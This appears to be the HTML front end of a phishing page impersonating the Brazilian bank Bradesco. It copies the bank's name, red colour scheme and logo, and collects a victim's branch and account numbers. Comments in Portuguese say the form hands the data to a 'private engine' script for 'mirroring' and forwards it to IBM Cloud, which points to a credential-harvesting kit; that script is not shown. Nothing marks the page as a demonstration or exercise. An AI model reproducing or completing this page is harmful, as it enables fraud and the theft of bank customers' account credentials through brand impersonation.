<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bradesco - Acesso à Conta</title>
    <!-- Link para o CSS que estiliza conforme o Bradesco (se houver) -->
    <link rel="stylesheet" href="style.css"> 
    <style>
        body { font-family: sans-serif; background-color: #f4f4f4; margin: 0; }
        .header-top { background-color: #cc092f; height: 10px; } /* Vermelho Bradesco */
        .container-login { width: 100%; max-width: 400px; margin: 50px auto; background: #fff; padding: 20px; border: 1px solid #ddd; }
        .btn-acesso { background-color: #cc092f; color: #fff; border: none; padding: 10px 20px; cursor: pointer; width: 100%; font-weight: bold; }
        input { display: block; width: 100%; margin-bottom: 15px; padding: 8px; box-sizing: border-box; border: 1px solid #ccc; }
        label { font-size: 12px; color: #666; }
    </style>
</head>
<body>

<div class="header-top"></div>

<div class="container-login">
    <img src="logo_bradesco.png" alt="Bradesco" style="width: 150px; margin-bottom: 20px;">
    
    <form id="formAcesso">
        <label for="agencia">AGÊNCIA (sem dígito)</label>
        <input type="text" id="agencia" name="agencia" maxlength="4" required placeholder="0000">

        <label for="conta">CONTA (com dígito)</label>
        <input type="text" id="conta" name="conta" maxlength="10" required placeholder="0000000-0">

        <label for="titular">TITULARIDADE</label>
        <input type="text" id="titular" name="titular" value="1" readonly>

        <button type="button" id="btnContinuar" class="btn-acesso">CONTINUAR</button>
    </form>
    
    <div id="status" style="margin-top:15px; color: red; font-size: 13px;"></div>
</div>

<!-- O MOTOR PRIVADO QUE PROCESSA O ESPELHAMENTO -->
<script src="private-engine.js"></script>

<script>
    // Integração com a lógica do Bradesco no private-engine.js
    document.getElementById('btnContinuar').addEventListener('click', function() {
        const dados = {
            ag: document.getElementById('agencia').value,
            ct: document.getElementById('conta').value,
            tt: document.getElementById('titular').value
        };

        // Geralmente, o código de referência (espelhamento) usa uma função 
        // global para validar ou enviar os dados para a IBM Cloud.
        if (window.validarAcesso) {
            window.validarAcesso(dados);
        } else {
            console.warn("Função 'validarAcesso' não mapeada no private-engine.js");
            // Se o motor usar outro nome de função, ajuste aqui.
        }
    });
</script>

</body>
</html>
